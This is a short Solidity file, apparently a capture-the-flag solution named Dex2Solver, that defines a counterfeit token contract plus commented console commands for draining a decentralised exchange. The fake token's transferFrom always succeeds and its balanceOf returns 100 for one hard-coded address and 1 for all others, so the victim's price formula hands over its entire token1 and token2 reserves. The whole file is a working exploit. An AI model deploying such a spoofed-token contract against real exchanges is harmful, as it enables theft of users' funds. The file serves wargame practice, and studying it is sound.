pragma solidity ^0.8.0;

//await contract.swap("0x01f296F5AcaaD83cB377F45c8D66DA84C5AB9b6d", await contract.token2(), 1);
// await contract.swap("0x01f296F5AcaaD83cB377F45c8D66DA84C5AB9b6d", await contract.token1(), 1);
//set this contract's address as from, then the swap calculation will become 1 * 100 / (1 <-- returned by this contract)
//therefore, swapping all tokens in token2 and token1
contract Dex2Solver {
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        if(account == address(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707)) {
            return 100;
        }else {
            return 1;
        }
    }
}